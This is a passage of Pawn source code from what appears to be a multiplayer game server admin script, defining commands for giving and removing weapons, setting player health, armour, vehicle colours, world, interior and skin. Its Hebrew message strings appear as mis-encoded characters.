		ammo2 = !strlen(cmd) || !IsNumeric(cmd)? 100000:strval(cmd);
		format(string,sizeof(string)," .%s Єэ %d ыух°щэ ь %s Ё··",GetName(id),ammo2,WeaponName(weaponid));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .Єэ %d ыух°щэ %s фрующя Ё·я ьъ",ammo2,WeaponName(weaponid));
		SendClientMessage(id,green,string);
		GiveWeapon(id,weaponid,ammo2);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if((equal(cmd,"/takeweapon") || equal(cmd,"/tw")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ЇЄщьхщх· Їьхё"))))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ЇЄщьхщх· Їьхё"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 5");
		if(playerinfo[playerid][srin]) return SendClientMessage(playerid,red," ?юф ч∙с·? ∙рЁщ ьр рчёхэ р· цф");
		new cmd2[M_S], id, weaponid, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /takeweapon [id/name] [weapon id] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		weaponid = IsNumeric(cmd2) ? strval(cmd2) : GetWeaponIDFromName(cmd2);
		if(weaponid < 0 || weaponid > 46 || weaponid == 19 || weaponid == 20 || weaponid == 21) return SendClientMessage(playerid,red," .∙э Ё∙ў рх юёЇ° ∙тхщ");
		if(!PlayerHasWeapon(id,weaponid)) return SendClientMessage(playerid,red," .рщя ь∙чўя фцф р· фЁ∙ў ∙ЎщщЁ·");
		RemovePlayerWeapon(id,weaponid);
		format(string,sizeof(string)," .%s ь %s ючў· р· фЁ∙ў",GetName(id),WeaponName(weaponid));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .%s - фрующя ючў р· фЁ∙ў ∙ьъ",WeaponName(weaponid));
		SendClientMessage(id,green,string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/gwlist") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new string[1024];
		string = "\t--- :/GiveWeapon °∙щю· фЁ∙ўщэ ьЇўхуф ---\n";
		for(new i = 0; i <= 46; i++)
		{
			if(i >= 19 && i <= 21) continue;
			format(string,sizeof(string),"%s\n* %02d - %s",string,i,WeaponName(i));
		}
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,"/GiveWeapon °∙щю· фЁ∙ўщэ ьЇўхуф",string,"OK","");
		return 1;
	}
	if(equal(cmd,"/helpmsg") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 5 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 5");
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /helpmsg [message number] :Ўх°· ф∙щюх∙");
		switch(strval(cmd))
		{
			case 1:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - Єц°ф -");
				SendClientMessageToAll(yellow," /Help :ьЄц°ф сюху щ∙ ьы·хс р· фЇўхуф");
				SendClientMessageToAll(blue,webpage);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 2:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - Їўхух· -");
				SendClientMessageToAll(yellow," /Commands :ь°∙щю· фЇўхух·");
				SendClientMessageToAll(yellow," .∙щюх ьс: сЇўхуф ∙фхцы°ф ьюЄьф °∙хюх· °ў фЇўхух· ∙ьр ∙щщых· ьчьўщэ сюху");
				SendClientMessageToAll(yellow," /Mode :Єху ф°сф Їўхух· ·хыьх ьюЎхр с");
				SendClientMessageToAll(blue,webpage);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 3:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - ∙щтх°щэ -");
				SendClientMessageToAll(yellow," .сЄц°· ф∙щтх°щэ ·хыьх ьфтщЄ ююўхэ ьюўхэ ььр юрюї");
				SendClientMessageToAll(yellow," /Tele рх /TM рх /Teleports :ь°∙щю· ф∙щтх°щэ");
				SendClientMessageToAll(blue,webpage);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 4:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - ущххч Єь Ў'щш°щэ -");
				SendClientMessageToAll(yellow," ?юЎр·э Ў'щш°");
				SendClientMessageToAll(yellow," /Report :ф∙·ю∙х сЇўхуф фцх сыущ ьуххч Єьщх");
				SendClientMessageToAll(yellow," /A :рх сЇўхуф фцх ыущ ь∙ьхч фхуЄф ьрующЁщэ");
				SendClientMessageToAll(blue,webpage);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 5:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - ф°∙юф -");
				SendClientMessageToAll(yellow," .юхюьї юрху ьф°∙э ь∙°· хьўсь щх·° рЇ∙°хщх· ю∙чў");
				SendClientMessageToAll(yellow," .ыр∙° Ё°∙ющэ, ыь юф ∙Є∙щ·э Єу ыф (Ё∙ўщэ, ыёє ссЁў, хЄху) щщ∙ю° тэ рэ ·Ўрх юф∙°·");
				SendClientMessageToAll(yellow," /Register :ьф°∙юф щ∙ ьы·хс р· фЇўхуф");
				SendClientMessageToAll(blue,webpage);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 6: AutoMessage();
			case 7:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - чхўщ ф∙°· -");
				new File:f = (fexist(file_rules)? fopen(file_rules,io_read):fopen(file_rules,io_readwrite)), string[M_S];
				while(fread(f,string,sizeof(string),false)) SendClientMessageToAll(yellow,string);
				fclose(f);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 8:
			{
				format(cmd,sizeof(cmd),"/helpmsg %d",randomEx(1,9));
				command(playerid,cmd);
			}
			default: SendClientMessage(playerid,red," .юёЇ° фхуЄф ∙тхщ");
		}
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/helpmsgs") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 5");
		SendClientMessage(playerid,lightblue," ~~~ :фхуЄх· Єц°ф ~~~");
		SendClientMessage(playerid,yellow,"1. Help");
		SendClientMessage(playerid,yellow,"2. Commands");
		SendClientMessage(playerid,yellow,"3. Teleports");
		SendClientMessage(playerid,yellow,"4. Report Cheaters");
		SendClientMessage(playerid,yellow,"5. Register");
		SendClientMessage(playerid,yellow,"6. Auto Message");
		SendClientMessage(playerid,yellow,"7. Rules");
		SendClientMessage(playerid,yellow,"8. Random");
		return 1;
	}
	if(equal(cmd,"/firework") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 5");
		if(!useFireworks) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЇЄщь цщўхў ы°тЄ");
		if(fireworks >= MAX_FIREWORKS-1) return SendClientMessage(playerid,red,"(" #MAX_FIREWORKS " ўщщющэ щх·° юущ цщўхўщэ, рЁр фю·я (ффтсьф: ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /firework [height] [model 1-2] [speed] :Ўх°· ф∙щюх∙");
		new Float:p[3], model = 0, Float:mspeed = 10.0, Float:height;
		height = floatstr(cmd),
		cmd = strtok(cmdtext,idx), model = !strlen(cmd) || !IsNumeric(cmd) || strval(cmd) < 1 || strval(cmd) > 2 ? (!random(2) ? 354 : 3666) : (strval(cmd) == 1 ? 354 : 3666),
		cmd = strtok(cmdtext,idx), mspeed = !strlen(cmd) ? 10.0 : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],1.5);
		CreateFirework(model,p[0],p[1],p[2],height,mspeed);
		SendClientMessage(playerid,green," .фцщўхў ЁхЎ° сфЎьчф");
		return 1;
	}
	if(equal(cmd,"/facepunch") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 5");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /facepunch [id/name] :Ўх°· ф∙щюх∙");
		new id, string[M_S];
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][punch]) return SendClientMessage(playerid,red," ...ьр щх·° юущ");
		playerinfo[id][punch] = 1;
		SetTimerEx("FacePunch",20,0,"iii",id,_:INVALID_TEXT_DRAW,0);
		format(string,sizeof(string)," *** %s has been punched by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/sethealth") || equal(cmd,"/seth")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ЇЄщьхщх· Їьхё"))))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ЇЄщьхщх· Їьхё"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new cmd2[M_S], id, Float:h, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /sethealth [id/name] [health] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(strfind(cmd2,".") != -1)
		{
			h = floatstr(cmd2);
			if(playerinfo[playerid][admin] != 20 && (h < 0.0 || h > 100.0)) return SendClientMessage(playerid,red," .рчхц чщщэ ∙тхщ");
			format(string,sizeof(string)," .ь %.1f %s ∙щЁщ· р· рчхц фчщщэ ∙ь",h,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· рчхц фчщщэ ∙ьъ ь %.1f",h);
		}
		else
		{
			h = float(strval(cmd2));
			if(playerinfo[playerid][admin] != 20 && (floatround(h) < 0 || floatround(h) > 100)) return SendClientMessage(playerid,red," .рчхц чщщэ ∙тхщ");
			format(string,sizeof(string)," .%.0f ь %s ∙щЁщ· р· рчхц фчщщэ ∙ь",h,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .%.0f фрующя ∙щЁф р· рчхц фчщщэ ∙ьъ ь",h);
		}
		SendClientMessage(id,green,string);
		SetPlayerHealth(id,h);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if((equal(cmd,"/setarmour") || equal(cmd,"/seta")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ЇЄщьхщх· Їьхё"))))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ЇЄщьхщх· Їьхё"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new cmd2[M_S], id, Float:a, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setarmour [id/name] [armour] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		a = strval(cmd2);
		if(strfind(cmd2,".") != -1)
		{
			a = floatstr(cmd2);
			if(playerinfo[playerid][admin] != 20 && a < 0.0 || a > 100.0) return SendClientMessage(playerid,red," .рчхц чщщэ ∙тхщ");
			format(string,sizeof(string)," .ь %.1f %s ∙щЁщ· р· рчхц фютя ∙ь",a,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· рчхц фютя ∙ьъ ь %.1f",a);
		}
		else
		{
			a = float(strval(cmd2));
			if(playerinfo[playerid][admin] != 20 && floatround(a) < 0 || floatround(a) > 100) return SendClientMessage(playerid,red," .рчхц чщщэ ∙тхщ");
			format(string,sizeof(string)," .%.0f ь %s ∙щЁщ· р· рчхц фютя ∙ь",a,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .%.0f фрующя ∙щЁф р· рчхц фютя ∙ьъ ь",a);
		}
		SendClientMessage(id,green,string);
		SetPlayerArmour(id,a);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if((equal(cmd,"/setvhealth") || equal(cmd,"/setvh")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new cmd2[M_S], id, Float:h, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setvhealth [id/name] [health] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!IsPlayerInAnyVehicle(id)) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ьр с°ыс");
		if(strfind(cmd2,".") != -1)
		{
			h = floatstr(cmd2);
			if(playerinfo[playerid][admin] != 20 && (h < 0.0 || h > 1000.0)) return SendClientMessage(playerid,red," .рчхц чщщэ ∙тхщ");
			format(string,sizeof(string)," .ь %.1f %s ∙щЁщ· р· рчхц фчщщэ ∙ь ф°ыс ∙ь",h,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· рчхц фчщщэ ∙ь ф°ыс ∙ьъ ь %.1f",h);
		}
		else
		{
			h = float(strval(cmd2));
			if(playerinfo[playerid][admin] != 20 && (floatround(h) < 0 || floatround(h) > 1000)) return SendClientMessage(playerid,red," .рчхц чщщэ ∙тхщ");
			format(string,sizeof(string)," .%.0f ь %s ∙щЁщ· р· рчхц фчщщэ ∙ь ф°ыс ∙ь",h,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .%.0f фрующя ∙щЁф р· рчхц фчщщэ ∙ьъ ь",h);
		}
		SendClientMessage(id,green,string);
		SetVehicleHealth(GetPlayerVehicleID(id),h);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if((equal(cmd,"/gethealth") || equal(cmd,"/getarmour") || equal(cmd,"/getvhealth")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new cmd2[M_S], id, Float:h, hname[32], string[M_S], i = 0, bool:staFound;
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /gethealth [id/name] | /getarmour [id/name] | /getvhealth [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," ~~~ :%s юЎс фчщщэ ∙ь ~~~",GetName(id));
		SendClientMessage(id,green,string);
		showstatus:
		{
			switch(i)
			{
				case 0: hname = "Health", GetPlayerHealth(id,h), staFound = true;
				case 1: hname = "Armour", GetPlayerArmour(id,h), staFound = true;
				case 2: if((staFound = bool:IsPlayerInAnyVehicle(id))) hname = "Vehicle Health", GetVehicleHealth(GetPlayerVehicleID(id),h);
				case 3: hname = "Godmod", h = playerinfo[id][gm] ? 666.0 : -666.0, staFound = true;
			}
			if(staFound)
			{
				if(floatabs(h) == 666.0) format(string,sizeof(string),"%s: " @c(white) "%s",hname,h > 0.0 ? ("Yes") : ("No"));
				else format(string,sizeof(string),"%s: " @c(white) "%.2f",hname,h);
				SendClientMessage(playerid,grey,string);
			}
		}
		if(i < 4)
		{
			i++;
			goto showstatus;
		}
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setvcolor") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new cmd2[M_S], id, c1, c2, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setvcolor [id/name] [color 1] [color 2] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!IsPlayerInAnyVehicle(id)) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ьр с°ыс");
		c1 = strval(cmd2), cmd = strtok(cmdtext,idx), c2 = !strlen(cmd)? c1:strval(cmd);
		if(!playerinfo[playerid][pp] && (c1 < 0 || c1 > 126 || c2 < 0 || c2 > 126)) return SendClientMessage(playerid,red," .рчу юфЎсЄщэ ∙тхщ");
		format(string,sizeof(string)," .ь %d х %d %s ∙щЁщ· р· ЎсЄщ ф°ыс ∙ь",c1,c2,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· ЎсЄщ ф°ыс ∙ьъ ьЎсЄщэ %d х %d",c1,c2);
		SendClientMessage(id,green,string);
		new v = GetPlayerVehicleID(id);
		ChangeVehicleColor(v,c1,c2);
		vehicleinfo[v][newvcol][0] = c1, vehicleinfo[v][newvcol][1] = c2;
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setvpaintjob") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new cmd2[M_S], id, pid, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setvpaintjob [id/name] [paintjob id] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!IsPlayerInAnyVehicle(id)) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ьр с°ыс");
		pid = strval(cmd2);
		if(!playerinfo[playerid][pp] && (pid < 1 || pid > 3)) return SendClientMessage(playerid,red," .Ўщх° °ыс ∙тхщ");
		format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· Ўщх° ф°ыс ∙ь",pid,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· Ўщх° ф°ыс ∙ьъ ь %d",pid);
		SendClientMessage(id,green,string);
		new v = GetPlayerVehicleID(id);
		ChangeVehiclePaintjob(v,pid);
		vehicleinfo[v][vpj] = pid;
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if((equal(cmd,"/getvcolor") || equal(cmd,"/getvpaintjob")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new id, string[M_S], c = white, clname[64], i = 0, bool:colFound = false;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getvcolor [id/name] | /getvpaintjob [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!IsPlayerInAnyVehicle(id)) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ьр с°ыс");
		format(string,sizeof(string)," ~~~ :%s ЎсЄщ ф°ыс ∙ь ~~~",GetName(id));
		SendClientMessage(playerid,lightblue,string);
		id = GetPlayerVehicleID(id);
		showcolor:
		{
			switch(i)
			{
				case 0: clname = "Color #1", c = vehicleinfo[id][newvcol][0], colFound = true;
				case 1: clname = "Color #2", c = vehicleinfo[id][newvcol][0], colFound = true;
				case 2: clname = "Spawn Color #1", c = vehicleinfo[id][vcol][0], colFound = true;
				case 3: clname = "Spawn Color #1", c = vehicleinfo[id][vcol][0], colFound = true;
				case 4: if((colFound = vehicleinfo[id][vpj] > -1)) clname = "Paintjob", c = vehicleinfo[id][vpj], colFound = true;
			}
			if(colFound)
			{
				format(string,sizeof(string),"%s: " @c(white) "%d",clname,c);
				SendClientMessage(playerid,grey,string);
			}
		}
		if(i < 5)
		{
			i++;
			goto showcolor;
		}
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setworld") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new cmd2[M_S], id, w, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setworld [id/name] [world] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		w = strval(cmd2);
		if(w < 0 || w > cellmax-5) return SendClientMessage(playerid,red," .юёЇ° Єхьэ ∙тхщ");
		format(string,sizeof(string)," .ьЄхьэ юёЇ° %d %s ∙щЁщ· р· фЄхьэ ∙ь",w,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· фЄхьэ ∙ьъ ьЄхьэ юёЇ° %d",w);
		SendClientMessage(id,green,string);
		SetPlayerVirtualWorld(id,w);
		if(IsPlayerInAnyVehicle(id)) SetVehicleVirtualWorld(GetPlayerVehicleID(id),w);
		return 1;
	}
	if(equal(cmd,"/getworld") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getworld [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," .фхр %d %s юёЇ° фЄхьэ фхщ°шхрьщ ∙ь",GetPlayerVirtualWorld(id),GetName(id));
		SendClientMessage(playerid,green,string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setinterior") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new cmd2[M_S], id, i, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setinterior [id/name] [interior] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		i = strval(cmd2);
		if(i < 0 || i > 20) return SendClientMessage(playerid,red," .рщЁш°щх° ∙тхщ");
		format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· фрщЁш°щх° ∙ь",i,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· фрщЁш°щх° ∙ьъ ь %d",i);
		SendClientMessage(id,green,string);
		SetPlayerInterior(id,i);
		return 1;
	}
	if(equal(cmd,"/getinterior") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 5");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getinterior [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," .фхр %d %s юёЇ° фрщЁш°щх° ∙ь",GetPlayerInterior(id),GetName(id));
		SendClientMessage(playerid,green,string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setskin") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new cmd2[M_S], id, s, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setskin [id/name] [skin id] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		s = strval(cmd2);
		if(!IsValidSkin(s) && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .юёЇ° уюх· ∙тхщ");
		if(GetPlayerState(id) >= PLAYER_STATE_EXIT_VEHICLE && GetPlayerState(id) <= PLAYER_STATE_ENTER_VEHICLE_PASSENGER) return SendClientMessage(playerid,red," .ў°р∙ ЁюЁЄ");
        if(GetPlayerAnimationIndex(id) != 1189/* 1189 = Єющуф */) return SendClientMessage(playerid, red, " .∙чўя цф Ў°щъ ьЄюху сюўхюх");
		if(IsPlayerInAnyVehicle(id))
		{
			new v = GetPlayerVehicleID(playerid), seat = GetPlayerVehicleSeat(playerid);
			ClearAnimations(playerid);
			SetPlayerSkin(id,s);
			PutPlayerInVehicle(playerid,v,seat);
		}
		else SetPlayerSkin(id,s);
		format(string,sizeof(string)," .ьуюх· юёЇ° %d %s ∙щЁщ· р· фуюх· ∙ь",s,GetName(id));
		SendClientMessage(playerid,green,string);
